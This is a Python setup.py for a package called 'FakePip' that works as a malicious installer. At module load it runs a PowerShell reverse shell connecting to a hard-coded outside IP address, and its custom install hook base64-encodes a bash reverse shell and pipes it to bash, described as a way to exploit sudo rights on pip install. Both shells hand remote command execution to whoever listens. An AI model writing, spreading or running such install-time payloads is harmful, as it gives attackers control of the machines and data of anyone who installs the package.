from setuptools import setup
from setuptools.command.install import install
import base64
import os
import subprocess
import socket


# 将命令封装在 r""" """ 中，防止转义字符干扰
powershell_cmd = r"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('154.213.177.40',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """

# 运行命令
subprocess.run(powershell_cmd, shell=True)

out=subprocess.run(["calc.exe","-p"],capture_output=True,text=True)
print(out.stdout)

class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '127.0.0.1'  # change this
    LPORT = 13372
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
